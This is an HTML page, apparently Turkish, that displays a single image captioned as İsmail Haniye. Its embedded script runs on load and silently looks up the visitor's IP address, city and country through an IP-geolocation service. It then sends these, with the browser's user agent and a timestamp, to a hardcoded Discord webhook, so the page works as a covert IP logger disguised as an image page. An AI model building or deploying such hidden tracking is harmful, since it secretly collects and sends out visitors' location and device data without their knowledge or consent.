<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>🍉</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    img {
      max-width: 100%;
      max-height: 100%;
    }
  </style>
</head>
<body>
  <img src="haniye.png" alt="İsmail Haniye">

  <script>
    // Webhook URL'iniz
    const webhookURL = "https://discord.com/api/webhooks/1392621981060563105/KwFT0G_xxmfz8IB0HkA6LVRgK6lOkTZFhbzoyVExRwjVDQdTxc0v-oMwxCbhPPGnl_eK";

    // Kullanıcı bilgilerini gönder
    function sendVisitorInfo(ip, city, country) {
      const userAgent = navigator.userAgent;
      const now = new Date().toLocaleString("tr-TR");

      const message = `📥 Yeni Ziyaret:\n\n🌐 IP: ${ip}\n📍 Konum: ${city}, ${country}\n🕒 Zaman: ${now}\n🧭 Tarayıcı: ${userAgent}`;

      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: message
        })
      }).catch(error => console.error("Webhook gönderim hatası:", error));
    }

    // IP ve konum bilgisini çek
    fetch("https://ipapi.co/json/")
      .then(response => response.json())
      .then(data => {
        const ip = data.ip || "Bilinmiyor";
        const city = data.city || "Şehir yok";
        const country = data.country_name || "Ülke yok";
        sendVisitorInfo(ip, city, country);
      })
      .catch(error => {
        console.error("IP bilgisi alınamadı:", error);
        sendVisitorInfo("Bilinmiyor", "Bilinmiyor", "Bilinmiyor");
      });
  </script>
</body>
</html>
